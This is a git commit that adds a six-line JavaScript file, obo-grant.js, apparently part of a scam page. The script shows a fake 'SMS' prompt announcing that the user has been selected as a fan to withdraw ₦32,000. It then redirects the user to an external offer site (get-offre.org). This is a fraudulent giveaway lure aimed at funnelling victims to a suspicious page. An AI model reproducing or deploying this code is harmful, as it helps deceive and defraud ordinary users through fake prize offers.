e19238b45d84d3e0dd1a17bf577af9ef0114c4e8
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-11-04 23:56:57 -0800

    Create obo-grant.js

---
+++ obo-grant.js
@@ -0,0 +1,6 @@
+
+var password = 'Withdraw ₦32,000'
+password=prompt('SMS: Congratulations you are among the selected fans to receive Withdraw ₦32,000, Kindly press Ok to Withdraw Cash ','Withdraw ₦32,000');
+if (password != 'Withdraw ₦32,000') {
+location.href='https://get-offre.org/davido-at32.html';
+}
